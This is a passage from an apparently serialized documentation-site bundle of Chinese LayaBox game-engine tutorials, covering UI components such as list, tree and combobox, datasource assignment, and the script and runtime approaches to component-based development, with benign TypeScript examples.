button\n\n游戏中常见的按钮组件\n\n * 常用\n   * toggle：为true时，可以通过点击切换按钮显示状态。为false时，点击后会直接恢复初始状态\n   * statenum：皮肤的状态数，支持单态，两态和三态按钮（正常态、滑入、按下）（正常态、滑入）\n   * selected：是否选中（按下或滑入）\n   * label：按钮的文本标签\n   * labelfont：标签字体\n   * labelsize：标签大小\n   * labelbold：标签加粗\n   * labelcolors：鼠标在元素释放时、鼠标移动到元素时、鼠标按下时各个状态下的标签颜色(格式:upcolor鼠标释放,overcolor处于上方,downcolor鼠标按下)\n   * labelalign：标签对齐模式，默认为居中对齐\n   * labelpadding：按钮文本标签的边距。 格式：上边距,右边距,下边距,左边距\n   * labelstroke：描边宽度（以像素为单位）。 默认值0，表示不描边\n   * labelstrokecolor：描边颜色，以字符串表示。 默认值为 #000000（黑色）strokecolors\n   * strokecolors：鼠标在元素释放时(抬起移开)、鼠标移动到元素时、鼠标按下时各个状态下的描边颜色(格式:upcolor,overcolor,downcolor)\n\n\n# checkbox\n\n多选框checkbox是继承自button的，它相比于button会 少一个labelalign属性，可以使用 labelpadding来调整多选框的文本 。\n\n\n# radio和radiogroup\n\n单选框radio是继承自button的，而单选框组radiogroup是用于 存放一组radio的容器；radio的属性跟button一样，radiogroup跟button有一部分属性是一样，还有一些自己独有的：\n\n * 常用\n   * labels：标签集合（该单选框组里有多少个单选框，就写他们的名字）\n   * space：间隔（单选框之间的间隔）\n   * direction：排列方向（横向horizontal，纵向vertical）\n   * selectedindex：选择索引，默认-1\n   * bgcolor：边线颜色\n\n可以 选中多个radio，然后转换为radiogroup，这样自定义的radiogroup有两个地方要注意，一是 每个item要规范命名，例如“item0、item1、item2、item3”；二是 不能在radiogroup的labels给每个单选框取名了，要到每个单选框自己的label上设置。\n\n\n# 切换标签与导航布局器\n\n\n# tab\n\ntab和radiogroup都继承自uigroup，uigroup继承自box；tab同样可以使用组件库里的tab，也可以选中一些组件然后转换为tab，同样也要注意命名的问题。\ntab跟radiogroup有相同的属性，只是多了一个 labelalign标签对齐模式。\n\n\n# viewstack\n\nviewstack通常跟tab配套使用，导航栏对应面板来显示，viewstack里面会存放box或者image这样的显示内容（命名通常是 item0、item1、item2、item3），切换tab时对应的viewstack也要切换\n\n * 常用\n   * selectedindex：选择索引\n\n\n# 基础容器与排版容器\n\n\n# box\n\nbox是整个容器组件的基础类，所有的容器组件都是继承自box；box可以作为 任何显示组件的容器，可以相对布局，其子节点也能绝对布局，它还可以作为list或tree的渲染项。\n\n\n# vbox\n\nvbox比box多了垂直布局，最后显示出来的全是排列垂直的（从上到下排列），区别就是align是左对齐还是右对齐还是居中对齐\n\n * 常用\n   * space：子对象的间隔\n   * align：布局元素的水平对齐\n\n\n# hbox\n\nhbox比box多了水平布局，最后显示出来的全是排列水平（从左到右排列），区别就是align是以顶部对齐还是以底部对齐还是居中对齐\n\n * 常用\n   * space：子对象的间隔\n   * align：布局元素的水平对齐\n\n\n# 列表组件\n\n\n# list\n\nlist列表组件常用于游戏中 排行榜、商店等，list包含基础的渲染项，每一项的ui构成基本相同，只是 渲染数据不同 而已。\n通常的做法是 先构建渲染项box，将它的rendertype设置为render，再选中渲染项box将其转换成容器ctrl+b，也就是转换成list容器。\n这样还不够，还需要设置list的大小还有xy方向的渲染数量等等属性：\n\n * 常用\n   * repeatx：x方向项数量（不设置的话，将按照渲染项和list宽高关系进行渲染）\n   * repeaty：y方向项数量（不设置的话，将按照渲染项和list宽高关系进行渲染）\n   * elasticenabled：是否使用橡皮筋效果，默认为false\n   * spacex：x方向项间隔（渲染项之间的间隔）\n   * spacey：y方向项间隔\n   * vscrollbarskin：垂直滚动条皮肤（不使用皮肤可以使用空格替代）\n   * hscrollbarskin：水平滚动条皮肤（不使用皮肤可以使用空格替代）\n   * selectenable：是否可以选中\n   * selectedindex：当前选择的项索引\n\nlist的渲染项也可以使用view，这样的好处是通用的渲染可以共用维护起来也方便，坏处就是ui多了可能会凌乱找不到对应的渲染项源文件。\n\nlist的渲染项赋值（array字段）：\n\nexport default class listui extends laya.dialog {\n    constructor() { super(); }\n    onenable(): void {\n        //模拟数据结构\n        let arr = [{\n            "top": { "value": "1" },\n            "name": { "text": "玩家名字1", "fontsize": 30, },\n            "score": { "text": "100" }\n        }, {\n            "top": { "value": "2" },\n            "name": { "text": "玩家名字2", "fontsize": 30, },\n            "score": { "text": "90" }\n        }, {\n            "top": { "value": "3" },\n            "name": { "text": "玩家名字3", "fontsize": 30, },\n            "score": { "text": "80" }\n        }];\n\n        let _list = this.getchildbyname("_list") as laya.list;\n        _list.array = arr;\n\n        //刷新list\n        _list.refresh();\n    }\n    ondisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 下拉列表选项框\n\n\n# combobox\n\n下拉框组件combobox其实是button组件和list组件组合而成的\n\n * 常用\n   * labels：下拉选项的标签文本集合\n   * labelfont：选中的标签字体\n   * labelsize：选中的标签文本大小\n   * labelbold：选中的标签文本加粗\n   * labelcolors：鼠标在元素释放时(抬起移开)、鼠标移动到元素之上时、鼠标按下时选中的标签颜色(格式:upcolor,overcolor,downcolor)\n   * labelpadding：选中的标签文本边距。 格式：上边距,右边距,下边距,左边距\n   * itemsize：项字体大小\n   * itemcolors：下拉选项列表的各种颜色(格式:鼠标滑过时的渲染项背景色overbgcolor,鼠标滑过的渲染项文本颜色overlabelcolor,鼠标滑出的默认文本颜色outlablecolor,边框颜色bordercolor,背景颜色bgcolor)\n   * skin：下拉框按钮皮肤地址\n   * statenum：按钮的状态值\n   * visiblenum：下拉列表中可显示的最大行数\n   * scrollbarskin：滚动条皮肤（想要滚动条但不想要皮肤，可以将值设置一个空格）\n   * selectedindex：按索引值设置显示默认值\n   * selectedlabel：按标签文本设置显示默认值\n   * sizegrid：九宫格信息(格式:上边距,右边距,下边距,左边距,是否平铺(0或1，可选))\n\n\n# 三种ui预设方法\n\n预设 就是提前把组件、功能面板或页面设置好，可以达到重用复用的目的，提高开发效率。\n\n 1. 对资源的预设：在资源库里双击已经命名好的组件，在“默认全局属性”里添加你想要预设的属性（预设属性时不要加空格、引号）\n    \n 2. 对功能面板的预设：将ui里重复使用的面板（例如list中的渲染项）单独拿出来制作成view，然后使用时直接将其拖拽到目的ui上即可\n    \n 3. “保存为预制体”：选中你的ui，然后在属性管理面板的右上角找到“保存预设”按钮，点击它再设置好名称就可以保存为预制体了\n\n第2种和第3种的区别：都可以在预设里面添加和修改内容，保存修改后的预设会在使用预设的地方会生效；不同的就是预制体使用的地方，是复制了一份预制体ui结构，可以 单独修改它也不会影响预制体，像第2种就不能在使用预设的地方修改。\n\n\n# 树结构组件\n\n\n# tree\n\n树结构组件 tree常 用于文件展示或者目录章节展示。\ntree的创建和list类似，它的渲染项一般是box或者预设（rendertype也是render），比较常见的属性有：\n\n * 常用\n   * scrollbarskin：滚动条皮肤\n   * selectedindex：当前选择的项索引\n   * spacebottom：项间隔距离\n   * spaceleft：左侧缩进距离\n   * keepstatus：数据源发生变化后，是否保持之前打开状态，默认为true。\n   * bgcolor：背景颜色（整个tree的背景颜色）\n\ntree的渲染项赋值（xml字段）：\n\nexport default class tree extends laya.tree {\n    constructor() { super(); }\n    onenable(): void {\n           //组装tree的模拟数据\n           let treedata = "<data>";\n           for (let i = 0; i < 5; ++i) {\n                treedata += "<item aaa=\'目录 " + (i + 1) + "\' isopen=\'false\'>";\n                for (let j = 0; j < 5; ++j) {\n                     treedata += "<leaf aaa=\'文件 " + (j + 1) + "\'/>";\n                }\n                treedata += "</item>";\n           }\n           treedata += "</data>";\n           // 将组装的字符串数据解决为xml\n        let xml = laya.utils.parsexmlfromstring(treedata);\n        // this本身就是tree，直接赋值给xml字段\n        this.xml = xml;\n    }\n    ondisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ntree展开有个坑点：背景图的名字必须是selectbox，折叠图标名字必须是arrow，文件图标名字必须是folder，而label名可以随意\n\n\n\n# 数据源和节点属性赋值\n\n组件在使用时有一个 datasource字段，它就是组件的数据源，在这个数据源里可以修改组件的属性，在运行时就会覆盖之前在ide上设置的组件属性。注意：sprite和uicomponent这一脉才有datasource字段，scene那一脉是没有的。\n\n * 这里是将btn继承了laya.button，然后将这个脚本放到组件的runtime里，当组件被启用执行后就会修改datasource：\n\nexport default class btn extends laya.button {\n    constructor() { super(); }\n    onenable(): void {\n        // 数据源，对属性进行重新赋值\n        this.datasource = {"labelsize":50,"label":"按钮"};\n        // 获取子节点（子节点的name属性要设置了值才可以通过getchildbyname获取到）\n        let son = this.getchildbyname("aaa") as laya.label;\n        // 对子节点属性进行重新复制\n        son.datasource =  {"fontsize":50,"text":"按钮子节点文本","color":"#000fff"};\n    }\n    ondisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n * datasource除了在runtime脚本里使用，也可以通过“添加组件”使用，但不是继承laya.button这样的ui了，是继承laya.script了：\n\nexport default class scriptdatasource extends laya.script {\n    /** @prop {name:inttype, tips:"整数类型示例", type:int, default:1000}*/\n    public inttype: number = 1000;\n    /** @prop {name:numtype, tips:"数字类型示例", type:number, default:1000}*/\n    public numtype: number = 1000;\n    /** @prop {name:strtype, tips:"字符串类型示例", type:string, default:"hello laya"}*/\n    public strtype: string = "hello laya";\n    /** @prop {name:booltype, tips:"布尔类型示例", type:bool, default:true}*/\n    public booltype: boolean = true;\n    // 更多参数说明请访问: https://ldc2.layabox.com/doc/?nav=zh-as-2-4-0\n\n    constructor() { super(); }\n\n    onenable(): void {\n        (this.owner as laya.uicomponent).datasource = {"text":"我是文本"};\n    }\n\n    ondisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n * 然后如下图，直接将该脚本拖到label节点下或者点击左侧属性管理面板中的“添加组件”\n   \n\n\n# 修改ide中属性的位置\n\n先进入basics所在目录\n\n再刚刚目录的上级目录也就是layaeditor目录然后进入renders目录，找到laya.editorui.xml文件，修改里面属性位置即可',charsets:{cjk:!0}},{title:"5.组件化开发",frontmatter:{title:"5.组件化开发"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/5.%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91.html",relativePath:"book-web/LayaBox游戏引擎/5.组件化开发.md",key:"v-74228cbc",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/5.%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91.html",headers:[{level:2,title:"组件化开发的思想",slug:"组件化开发的思想",normalizedTitle:"组件化开发的思想",charIndex:12},{level:2,title:"“组件化开发”中的组件",slug:"组件化开发-中的组件",normalizedTitle:"“组件化开发”中的组件",charIndex:170},{level:2,title:"组件化开发的方式",slug:"组件化开发的方式",normalizedTitle:"组件化开发的方式",charIndex:587},{level:2,title:"script脚本开发流程",slug:"script脚本开发流程",normalizedTitle:"script脚本开发流程",charIndex:851},{level:3,title:"script脚本挂载到组件上",slug:"script脚本挂载到组件上",normalizedTitle:"script脚本挂载到组件上",charIndex:868},{level:3,title:"编写script脚本",slug:"编写script脚本",normalizedTitle:"编写script脚本",charIndex:1117},{level:3,title:"script脚本属性在IDE里可视化",slug:"script脚本属性在ide里可视化",normalizedTitle:"script脚本属性在ide里可视化",charIndex:1586},{level:3,title:"重写声明周期函数",slug:"重写声明周期函数",normalizedTitle:"重写声明周期函数",charIndex:2531},{level:3,title:"了解整个生命周期",slug:"了解整个生命周期",normalizedTitle:"了解整个生命周期",charIndex:3614},{level:2,title:"runtime脚本开发流程",slug:"runtime脚本开发流程",normalizedTitle:"runtime脚本开发流程",charIndex:4380},{level:3,title:"关联runtime脚本",slug:"关联runtime脚本",normalizedTitle:"关联runtime脚本",charIndex:4398},{level:3,title:"编写runtime脚本",slug:"编写runtime脚本",normalizedTitle:"编写runtime脚本",charIndex:4476},{level:3,title:"发布模式对runtime脚本的影响",slug:"发布模式对runtime脚本的影响",normalizedTitle:"发布模式对runtime脚本的影响",charIndex:5456},{level:2,title:"两种方式的区别和应用场景",slug:"两种方式的区别和应用场景",normalizedTitle:"两种方式的区别和应用场景",charIndex:829},{level:3,title:"区别",slug:"区别",normalizedTitle:"区别",charIndex:834},{level:3,title:"应用场景",slug:"应用场景",normalizedTitle:"应用场景",charIndex:837}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"组件化开发的思想 “组件化开发”中的组件 组件化开发的方式 script脚本开发流程 script脚本挂载到组件上 编写script脚本 script脚本属性在IDE里可视化 重写声明周期函数 了解整个生命周期 runtime脚本开发流程 关联runtime脚本 编写runtime脚本 发布模式对runtime脚本的影响 两种方式的区别和应用场景 区别 应用场景",content:'# 组件化开发\n\n\n# 组件化开发的思想\n\n很多项目的 耦合性比较高，后期改造、维护难度比较大，如果项目 使用“组件化开发” 这种模式，可以对项目进行很大程度上的 解耦，也就降低了维护项目的难度和成本。“组件化开发”的 核心思想是尽可能将业务逻辑模块化，将逻辑都写在脚本里，然后将脚本和组件关联起来，使用组件时对应的脚本就会运行。\n\n\n# “组件化开发”中的组件\n\n在3.组件库的介绍这篇里介绍过组件库，也提到过功能类组件，这些都是“组件化开发”中的组件，可以整体的分为这样几类：\n\n该图片地址：https://www.processon.com/mindmap/5f58fba0e401fd60bdeb855b\n\n * 节点类组件(Node)：2D基础组件（Animation\\HTMLDivElement\\Sprite\\Text）、基础显示组件（Button\\Image\\Label等）、容器组件（Box\\List\\Panel等）、视图组件（Scene\\View\\Dialog）；\n * 绘图类组件(Graphics)：矢量图（Circle\\Curves\\Line等）、纹理（Texture\\FillTexture）和文本（FillText）；\n * 功能类组件(Component)：组件（脚本组件、物理组件等）、泛组件（滤镜组件，类似Component）。\n\n\n# 组件化开发的方式\n\n组件有自己的 生命周期，在对应的生命周期函数里可以执行一些游戏逻辑，如果 将一个脚本继承自组件，然后在脚本里 重写组件的生命周期函数并写上相应的游戏逻辑 ，这样的开发方式叫做 runTime脚本进行组件化开发。\n\n如果不使用runtime方式，可以 给组件挂载一个script脚本（不继承自组件，是挂载的方式），该脚本 也有自己的生命周期 并与组件的生命周期是 息息相关的，这种开发方式叫做 script脚本进行组件化开发。\n\n两种方式的差异和应用会在最后一小节“两种方式的区别和应用场景”里讲述。\n\n\n# script脚本开发流程\n\n\n# script脚本挂载到组件上\n\n其实在上一个章节就提到过怎么将script脚本添加到组件上了，这里梳理一下：\n\n * 准备好 目标组件 ，然后在项目的src/script目录下新建一个脚本，使用的是ts语言，那脚本就是xxx.ts之类的；\n * 将脚本拖拽到层级面板中的 目标组件节点下 或者直接拖拽到 目标组件的属性面板里，这样script脚本就挂载到组件上了；\n * 除了拖拽的方法外，还可以在目标组件的 属性面板 最下方点击 “添加组件”，选择“Code”再选择对应的脚本即可。\n\n\n\n\n# 编写script脚本\n\n比如在组件激活时（onEnable）将图片放大至两倍，最基本的脚本写法：\n\nexport default class scaleDemo extends Laya.Script {\n    public img: Laya.Image;\n    constructor() {\n        super();\n    }\n    // UI组件的赋值最好在onEnable里编写，别在构造函数里写，因为组件可能还没有激活\n    onEnable() {\n        // script脚本化开发，获取本组件是通过this.owner来获取的\n        this.img = this.owner as Laya.Image;\n        this.img.scaleX = 2;\n        this.img.scaleY = 2;\n    }\n    onDisable() {\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# script脚本属性在IDE里可视化\n\n1)可以将script脚本中的属性在IDE中显示出来，示例如下\n\n/** @prop {name:big,tips:"放大",type:int,default:2} */\npublic big: number = 2;\n\n\n1\n2\n\n\n\n\n2)定义属性常用的字段解释：\n\n * name：属性在IDE中展示的名字；\n * tips：在IDE里将鼠标悬浮到属性上时，会展示一个tips提示；\n * default：属性在IDE中展示的默认值，在 script脚本中也要给变量赋值这个默认值，否则可能会发生一些错误或者达不到效果；\n * type：属性在IDE里的数据类型，Number、Int（ts对应number）、String、Boolean（布尔类型，ts对应boolean）、Color（颜色，ts对应string）、Vec（数组，ts对应number[]）、Vector（动态数组，ts对应any[]）、Option（下拉框，ts对应string）、EditOption（可编辑下拉框但不能定义默认值，ts对应string）、Ease（缓动类型，ts对应string）、sNumber（数字滑动条，ts对应number）、Prefab（预制体，代码对应Laya.Prefab）、Node（节点，代码对应Laya.xxx）、Nodes（对节点，代码是Laya.xxx的数组形式） 等等；\n * accept和acceptTypes：当 type为string 时，可以使用 accept和acceptTypes 来具体约束这个string；比如accept可以是 res、files，意思是属性的类型要是 资源路径、文件路径，acceptTypes可以是 "png,jpg"，意思是路径后缀必须是 png、jpg\n * option：当 type为Option 时，option用来存放 下拉框所有选项；\n * min和max：当 sNumber 时，min和max就是 滑动条的上下限；\n\nPS：预制体在script脚本中使用，this.prefab.create()或者this.prefab.json.props.texture\n\n\n# 重写声明周期函数\n\nLaya.Script有自己的生命周期函数，script脚本继承自Laya.Script，重写对应的生命周期函数，并在其中编写控制组件的逻辑代码\n\nexport default class scaleDemo extends Laya.Script {\n    /** @prop {name:big,tips:"放大",type:int,default:2} */\n    public big: number = 2;\n    /** @prop {name:small,tips:"缩小",type:number,default:0.5} */\n    public small: number = 0.5;\n    public img: Laya.Image;\n    constructor() {\n        super();\n    }\n    // UI组件的赋值最好在onEnable里编写，别在构造函数里写，因为组件可能还没有激活\n    onEnable() {\n        // script脚本化开发，获取本组件是通过this.owner来获取的\n        this.img = this.owner as Laya.Image;\n    }\n    // 键盘按下\n    onKeyDown() {\n        this.img.scaleX = this.small;\n        this.img.scaleY = this.small;\n    }\n    // 每帧更新\n    onUpdate() {\n        // 旋转\n        this.img.rotation++;\n    }\n    // 鼠标按下\n    onMouseDown() {\n        // 按住拖住\n        this.img.startDrag();\n    }\n    // 在舞台上点击\n    onStageClick() {\n        this.img.scaleX = this.big;\n        this.img.scaleY = this.big;\n    }\n    onDisable() {\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 了解整个生命周期\n\n1)script脚本的生命周期：\n\nscript脚本除了生命周期函数以外，还有一些鼠标点击、键盘和碰撞等事件，当然也不止这些事件，可以去laya.components.Script这个API里查看事件。\n\n2)runtime脚本的生命周期，也是节点or组件的生命周期：\n\n\n * 创建节点：会先创建节点的 script脚本（执行script脚本的构造函数），再创建节点的 子节点（执行子节点的构造函数），这样就完成了一个节点的创建；\n * addToStage：先激活 script脚本（执行script脚本的onAwake函数再执行onEnable函数），再激活 子节点（执行子节点的onAwake函数再执行onEnable函数），完成这两步之后才激活 节点本身（执行节点本身的onAwake函数再执行onEnable函数）；\n * removeFromStage：先禁用 script脚本（执行script脚本的onDisable函数），再禁用 子节点（执行子节点的onDisable函数），完成这两步之后才禁用 节点本身（执行节点本身的onDisable函数）；\n * destroy：会先判断节点是否已经禁用了，没有禁用的先禁用（removeFromStage）；然后会去销毁 script脚本（执行script脚本的onDestroy函数），再去销毁 子节点（执行子节点的onDestroy函数），完成这两步之后才销毁 节点本身（执行节点本身的onDestroy函数）。\n\n也就是说 runtime脚本的生命周期函数只有四个：onAwake（激活）、onEnable（启用）、onDisable（禁用）、onDestroy（销毁），而 script脚本不止四个并且还带有鼠标、键盘、碰撞事件。\n\n\n# runtime脚本开发流程\n\n\n# 关联runtime脚本\n\n直接将runtime脚本拖拽到组件的runtime属性里，或者直接在runtime属性里输入runtime脚本的路径。\n\n\n\n# 编写runtime脚本\n\n编写runtime脚本需要注意的是\n\n * runtime脚本生命周期函数只有四个：onAwake（激活）、onEnable（启用）、onDisable（禁用）、onDestroy（销毁）\n * 没有script脚本的 属性可视化，因为本来就是继承自组件，不需要可视化\n\nexport default class ListUI extends Laya.Dialog {\n    constructor() { super(); }\n    onEnable(): void {\n        //模拟数据结构\n        let arr = [{\n            "top": { "value": "1" },\n            "name": { "text": "玩家名字1", "fontSize": 30, },\n            "score": { "text": "100" }\n        }, {\n            "top": { "value": "2" },\n            "name": { "text": "玩家名字2", "fontSize": 30, },\n            "score": { "text": "90" }\n        }, {\n            "top": { "value": "3" },\n            "name": { "text": "玩家名字3", "fontSize": 30, },\n            "score": { "text": "80" }\n        }];\n\n        let _list = this.getChildByName("_list") as Laya.List;\n        _list.array = arr;\n\n        //刷新List\n        _list.refresh();\n    }\n    onDisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 发布模式对runtime脚本的影响\n\n之前在2.IDE的使用#项目设置里提到过“场景的发布模式”，这里简单做一个总结：\n\n * “内嵌模式” 生成了场景类并将UI数据内嵌到类里，使用方便但是代码包体积大；\n * “加载模式” 也生成场景类但将所有UI数据放到一个UI.json里（UI数据从类里分离出来了），减少了代码包体积但需要提前加载大的UI.json；\n * 小游戏问世前常使用“内嵌模式”和“加载模式”，后来常使用“分离模式”和“文件模式”。\n * “分离模式” 也生成场景类但每个场景的UI数据有单独的场景数据文件，并且引擎是自动加载场景对应的场景数据文件；\n * “文件模式” 没有生成场景类（所以不能使用var要使用getchild操作子节点），只有场景数据文件并通过Scene.load来加载使用，大大减少了代码包体积。\n * 建议是 将项目设置的发布模式设置为“文件模式”，如果某个场景的 层级复杂、操作频繁并使用了runtime脚本，getchild会很麻烦且效率低，那么可以 单独将这个场景的发布模式设置为“分离模式”，这样就可以使用var了；也就是绝大多数的场景使用“文件模式”，个别使用“分离模式”。\n\n\n# 两种方式的区别和应用场景\n\n\n# 区别\n\n * runtime脚本是 直接继承自组件 ，本组件直接就是this，其子节点获取方式是 getChildByName 或者 分离模式下搭配var ；\n * script脚本是 继承自Laya.Script，本组件是 this.owner ，其子节点获取方式是 getChildByName 或者使用 定义属性可视化来绑定子节点（type设置为Node，将子节点拖拽到该自定义属性里）；\n * 如果两种方式不考虑其他而都使用getChildByName来获取子节点，由于script脚本多一层owner，会导致效率会低一些；\n * 对比两种方式的生命周期图，会发现 script脚本的生命周期函数更多并且还自带鼠标、键盘和碰撞的方法，而 runtime脚本的生命周期函数只有四个：onAwake（激活）、onEnable（启用）、onDisable（禁用）、onDestroy（销毁）。\n\n\n# 应用场景\n\n * 像一些主场景、大的页面UI这样的，可能需要频繁地访问页面内多个元素（多为显示隐藏等类似简单逻辑），这样的应用场景下可以使用runtime脚本；\n * 如果主场景、大的页面UI里涉及到的业务很多且很复杂，像runtime脚本的四个生命周期函数和this.on复杂绑定方式满足不了开发需求，可以使用script脚本；当然，UI中具体的节点也会涉及到一些逻辑，这样的建议使用script脚本挂载。\n * 也就是说，像控制显示隐藏这样的简单逻辑的使用runtime脚本就足够了，更多地是涉及到复杂业务逻辑就使用script脚本（例如游戏总控制、角色控制等）。\n\n',normalizedContent:'# 组件化开发\n\n\n# 组件化开发的思想\n\n很多项目的 耦合性比较高，后期改造、维护难度比较大，如果项目 使用“组件化开发” 这种模式，可以对项目进行很大程度上的 解耦，也就降低了维护项目的难度和成本。“组件化开发”的 核心思想是尽可能将业务逻辑模块化，将逻辑都写在脚本里，然后将脚本和组件关联起来，使用组件时对应的脚本就会运行。\n\n\n# “组件化开发”中的组件\n\n在3.组件库的介绍这篇里介绍过组件库，也提到过功能类组件，这些都是“组件化开发”中的组件，可以整体的分为这样几类：\n\n该图片地址：https://www.processon.com/mindmap/5f58fba0e401fd60bdeb855b\n\n * 节点类组件(node)：2d基础组件（animation\\htmldivelement\\sprite\\text）、基础显示组件（button\\image\\label等）、容器组件（box\\list\\panel等）、视图组件（scene\\view\\dialog）；\n * 绘图类组件(graphics)：矢量图（circle\\curves\\line等）、纹理（texture\\filltexture）和文本（filltext）；\n * 功能类组件(component)：组件（脚本组件、物理组件等）、泛组件（滤镜组件，类似component）。\n\n\n# 组件化开发的方式\n\n组件有自己的 生命周期，在对应的生命周期函数里可以执行一些游戏逻辑，如果 将一个脚本继承自组件，然后在脚本里 重写组件的生命周期函数并写上相应的游戏逻辑 ，这样的开发方式叫做 runtime脚本进行组件化开发。\n\n如果不使用runtime方式，可以 给组件挂载一个script脚本（不继承自组件，是挂载的方式），该脚本 也有自己的生命周期 并与组件的生命周期是 息息相关的，这种开发方式叫做 script脚本进行组件化开发。\n\n两种方式的差异和应用会在最后一小节“两种方式的区别和应用场景”里讲述。\n\n\n# script脚本开发流程\n\n\n# script脚本挂载到组件上\n\n其实在上一个章节就提到过怎么将script脚本添加到组件上了，这里梳理一下：\n\n * 准备好 目标组件 ，然后在项目的src/script目录下新建一个脚本，使用的是ts语言，那脚本就是xxx.ts之类的；\n * 将脚本拖拽到层级面板中的 目标组件节点下 或者直接拖拽到 目标组件的属性面板里，这样script脚本就挂载到组件上了；\n * 除了拖拽的方法外，还可以在目标组件的 属性面板 最下方点击 “添加组件”，选择“code”再选择对应的脚本即可。\n\n\n\n\n# 编写script脚本\n\n比如在组件激活时（onenable）将图片放大至两倍，最基本的脚本写法：\n\nexport default class scaledemo extends laya.script {\n    public img: laya.image;\n    constructor() {\n        super();\n    }\n    // ui组件的赋值最好在onenable里编写，别在构造函数里写，因为组件可能还没有激活\n    onenable() {\n        // script脚本化开发，获取本组件是通过this.owner来获取的\n        this.img = this.owner as laya.image;\n        this.img.scalex = 2;\n        this.img.scaley = 2;\n    }\n    ondisable() {\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# script脚本属性在ide里可视化\n\n1)可以将script脚本中的属性在ide中显示出来，示例如下\n\n/** @prop {name:big,tips:"放大",type:int,default:2} */\npublic big: number = 2;\n\n\n1\n2\n\n\n\n\n2)定义属性常用的字段解释：\n\n * name：属性在ide中展示的名字；\n * tips：在ide里将鼠标悬浮到属性上时，会展示一个tips提示；\n * default：属性在ide中展示的默认值，在 script脚本中也要给变量赋值这个默认值，否则可能会发生一些错误或者达不到效果；\n * type：属性在ide里的数据类型，number、int（ts对应number）、string、boolean（布尔类型，ts对应boolean）、color（颜色，ts对应string）、vec（数组，ts对应number[]）、vector（动态数组，ts对应any[]）、option（下拉框，ts对应string）、editoption（可编辑下拉框但不能定义默认值，ts对应string）、ease（缓动类型，ts对应string）、snumber（数字滑动条，ts对应number）、prefab（预制体，代码对应laya.prefab）、node（节点，代码对应laya.xxx）、nodes（对节点，代码是laya.xxx的数组形式） 等等；\n * accept和accepttypes：当 type为string 时，可以使用 accept和accepttypes 来具体约束这个string；比如accept可以是 res、files，意思是属性的类型要是 资源路径、文件路径，accepttypes可以是 "png,jpg"，意思是路径后缀必须是 png、jpg\n * option：当 type为option 时，option用来存放 下拉框所有选项；\n * min和max：当 snumber 时，min和max就是 滑动条的上下限；\n\nps：预制体在script脚本中使用，this.prefab.create()或者this.prefab.json.props.texture\n\n\n# 重写声明周期函数\n\nlaya.script有自己的生命周期函数，script脚本继承自laya.script，重写对应的生命周期函数，并在其中编写控制组件的逻辑代码\n\nexport default class scaledemo extends laya.script {\n    /** @prop {name:big,tips:"放大",type:int,default:2} */\n    public big: number = 2;\n    /** @prop {name:small,tips:"缩小",type:number,default:0.5} */\n    public small: number = 0.5;\n    public img: laya.image;\n    constructor() {\n        super();\n    }\n    // ui组件的赋值最好在onenable里编写，别在构造函数里写，因为组件可能还没有激活\n    onenable() {\n        // script脚本化开发，获取本组件是通过this.owner来获取的\n        this.img = this.owner as laya.image;\n    }\n    // 键盘按下\n    onkeydown() {\n        this.img.scalex = this.small;\n        this.img.scaley = this.small;\n    }\n    // 每帧更新\n    onupdate() {\n        // 旋转\n        this.img.rotation++;\n    }\n    // 鼠标按下\n    onmousedown() {\n        // 按住拖住\n        this.img.startdrag();\n    }\n    // 在舞台上点击\n    onstageclick() {\n        this.img.scalex = this.big;\n        this.img.scaley = this.big;\n    }\n    ondisable() {\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 了解整个生命周期\n\n1)script脚本的生命周期：\n\nscript脚本除了生命周期函数以外，还有一些鼠标点击、键盘和碰撞等事件，当然也不止这些事件，可以去laya.components.script这个api里查看事件。\n\n2)runtime脚本的生命周期，也是节点or组件的生命周期：\n\n\n * 创建节点：会先创建节点的 script脚本（执行script脚本的构造函数），再创建节点的 子节点（执行子节点的构造函数），这样就完成了一个节点的创建；\n * addtostage：先激活 script脚本（执行script脚本的onawake函数再执行onenable函数），再激活 子节点（执行子节点的onawake函数再执行onenable函数），完成这两步之后才激活 节点本身（执行节点本身的onawake函数再执行onenable函数）；\n * removefromstage：先禁用 script脚本（执行script脚本的ondisable函数），再禁用 子节点（执行子节点的ondisable函数），完成这两步之后才禁用 节点本身（执行节点本身的ondisable函数）；\n * destroy：会先判断节点是否已经禁用了，没有禁用的先禁用（removefromstage）；然后会去销毁 script脚本（执行script脚本的ondestroy函数），再去销毁 子节点（执行子节点的ondestroy函数），完成这两步之后才销毁 节点本身（执行节点本身的ondestroy函数）。\n\n也就是说 